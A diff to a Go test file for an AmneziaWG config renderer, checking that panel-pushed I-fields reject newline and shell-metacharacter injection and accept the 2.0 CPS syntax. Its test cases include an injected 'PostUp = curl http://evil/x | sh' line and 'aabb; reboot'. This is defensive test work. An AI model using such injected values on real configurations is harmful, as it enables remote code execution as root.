@@ -185,11 +185,12 @@ func TestRenderConfigRejectsInjectedPrivateKey(t *testing.T) {
 	}
 }
 
-// renderConfig must reject any panel-pushed I1-I5 mimicry value that isn't a
-// plain hex string, closing the same [Interface]/PostUp injection → root-RCE
-// class the WG-key/AllowedIP validators guard against. I-fields are written
-// verbatim into the awg-quick INI, so a newline lets a value inject a PostUp
-// directive that runs as root on `awg-quick up`.
+// renderConfig must reject any panel-pushed I1-I5 mimicry value outside the
+// allowed set (plain hex, or a 2.0 CPS built from <b 0x..>, <r N> and <t>),
+// closing the [Interface]/PostUp injection to root-RCE class the WG-key and
+// AllowedIP validators guard against. I-fields are written verbatim into the
+// awg-quick INI, so a newline would let a value inject a PostUp directive that
+// runs as root on `awg-quick up`.
 func TestRenderConfigRejectsInjectedIField(t *testing.T) {
 	cases := []struct {
 		name string
@@ -197,7 +198,9 @@ func TestRenderConfigRejectsInjectedIField(t *testing.T) {
 	}{
 		{"newline injecting PostUp", "aabb\nPostUp = curl http://evil/x | sh"},
 		{"shell metachar", "aabb; reboot"},
-		{"space then directive", "aabb ListenPort = 9"},
+		// A bare space is legal inside a CPS tag, so this case must be refused
+		// on the '=' and the directive letters, not on the space itself.
+		{"directive after a space", "aabb ListenPort = 9"},
 		{"non-hex letter", "aabbzz"},
 	}
 	for _, tc := range cases {
@@ -218,6 +221,17 @@ func TestRenderConfigAcceptsHexIField(t *testing.T) {
 	cfg.I5 = ""
 	if _, err := renderConfig(cfg, nil); err != nil {
 		t.Errorf("valid hex I-field rejected: %v", err)
+	}
+}
+
+// An AmneziaWG 2.0 CPS signature is the documented mimicry syntax and must be
+// accepted: its tags still cannot break out of the I-line. Kept in sync with
+// the panel's ObfuscationSchema regex.
+func TestRenderConfigAcceptsCpsIField(t *testing.T) {
+	cfg := validInbound()
+	cfg.I1 = "<b 0xc00000000108><r 64><t>"
+	if _, err := renderConfig(cfg, nil); err != nil {
+		t.Errorf("valid 2.0 CPS I-field rejected: %v", err)
 	}
 }
 
